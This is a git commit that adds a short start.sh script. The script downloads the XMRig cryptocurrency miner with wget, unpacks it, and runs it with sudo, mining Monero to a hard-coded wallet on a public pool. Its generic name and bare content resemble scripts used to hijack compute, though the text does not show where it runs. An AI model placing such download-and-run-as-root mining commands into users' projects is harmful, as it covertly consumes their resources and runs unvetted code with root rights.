1e82f08eef7dcbb79a96904c7bd59d6ed61c1e4e
kindelux <75550116+kindelux@users.noreply.github.com>
2021-04-17 17:37:09 +0300

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz
+tar -xzvf xmrig-6.11.2-linux-x64.tar.gz
+cd xmrig-6.11.2
+sudo ./xmrig -a rx/0 -o monero.herominers.com:10191 -u 48uyfcoKX2ycP84w3kwMXnBjDgEYCF8q6PWr7oEK1j91CSUrJGp8M78V4dedTZeGGKforsWx6VNiUKL6PFxunYf3HxofSgE -k --tls -p p0rk7
